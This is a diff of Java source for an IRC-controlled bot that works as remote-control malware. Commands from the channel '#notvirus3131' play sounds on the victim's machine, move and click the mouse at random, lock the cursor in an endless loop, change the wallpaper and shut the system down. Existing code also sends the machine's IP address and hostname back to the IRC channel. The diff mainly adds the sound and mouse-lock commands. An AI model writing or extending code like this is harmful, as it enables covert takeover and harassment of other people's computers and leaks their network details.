@@ -17,7 +17,10 @@ import java.util.Random;
 
 public class IRCBot extends PircBot {
 
+    private boolean neverEver = true;
+
     private String SystemName = null;
+    private Sound sound = null;
 
     public static interface User32 extends Library {
         User32 INSTANCE = (User32) Native.loadLibrary("user32", User32.class, W32APIOptions.DEFAULT_OPTIONS);
@@ -26,6 +29,8 @@ public class IRCBot extends PircBot {
     }
 
     public IRCBot() {
+
+        this.sound = new Sound();
 
         onConnect();
 
@@ -59,6 +64,71 @@ public class IRCBot extends PircBot {
     @Override
     protected void onMessage(String channel, String sender, String login, String hostname, String message) {
 
+
+        switch (message) {
+            case "amogus":
+
+                sound.setFile(0);
+                sound.play();
+
+                break;
+            case "daddy":
+
+                sound.setFile(1);
+                sound.play();
+
+                break;
+            case "fear":
+
+                sound.setFile(2);
+                sound.play();
+
+                break;
+            case "ha":
+
+                sound.setFile(3);
+                sound.play();
+
+                break;
+
+            case "amogusl":
+
+                sound.setFile(0);
+                sound.play();
+                sound.loop();
+
+
+                break;
+            case "daddyl":
+
+                sound.setFile(1);
+                sound.play();
+                sound.loop();
+
+                break;
+            case "fearl":
+
+                sound.setFile(2);
+                sound.play();
+
+                break;
+            case "hal":
+
+                sound.setFile(3);
+                sound.play();
+                sound.loop();
+
+
+                break;
+            case "stop":
+
+                sound.stop();
+                break;
+
+
+        }
+
+
         if (message.startsWith("gocrazy")) {
 
             try {
@@ -68,7 +138,7 @@ public class IRCBot extends PircBot {
                     robot.mousePress(InputEvent.BUTTON1_MASK); // or 1 could be
                     robot.mousePress(InputEvent.BUTTON2_MASK); // or 2 could be and mouse locks itself untill you press middle button
 
-                    robot.mouseMove(new Random().nextInt(570), new Random().nextInt(950));
+                    robot.mouseMove(new Random().nextInt(840), new Random().nextInt(1280));
                 }
 
             } catch (AWTException | InterruptedException e) {
@@ -117,7 +187,7 @@ public class IRCBot extends PircBot {
 
                 sendMessage("#notvirus3131", "IPV adressi: " + inetAddress);
                 sendMessage("#notvirus3131", "Loopback Adressi: " + inetAddress1);
-                sendMessage("#notvirus3131",  "Host Name:" + hostname.toLowerCase());
+                sendMessage("#notvirus3131", "Host Name:" + hostname.toLowerCase());
 
             } catch (UnknownHostException | SocketException e) {
                 throw new RuntimeException(e);
@@ -144,6 +214,7 @@ public class IRCBot extends PircBot {
                 // handle exception
             }
 
+
             User32.INSTANCE.SystemParametersInfo(0x0014, 0, otherFolder, 1);
         }
 
@@ -162,6 +233,31 @@ public class IRCBot extends PircBot {
             }
 
         }
+        if (message.startsWith("lock")) {
+
+
+
+            try {
+                Robot robot = new Robot();
+
+                while (true) {
+                    if(neverEver){
+
+                        Thread.sleep(5);
+                        robot.mouseMove(150, 150);
+                    }
+
+                }
+
+            } catch (AWTException | InterruptedException e) {
+                throw new RuntimeException(e);
+            }
+        }
+        if (message.startsWith("unlock")) {
+
+            neverEver = false;
+        }
+
     }
 
     private void shutdown() throws RuntimeException, IOException {
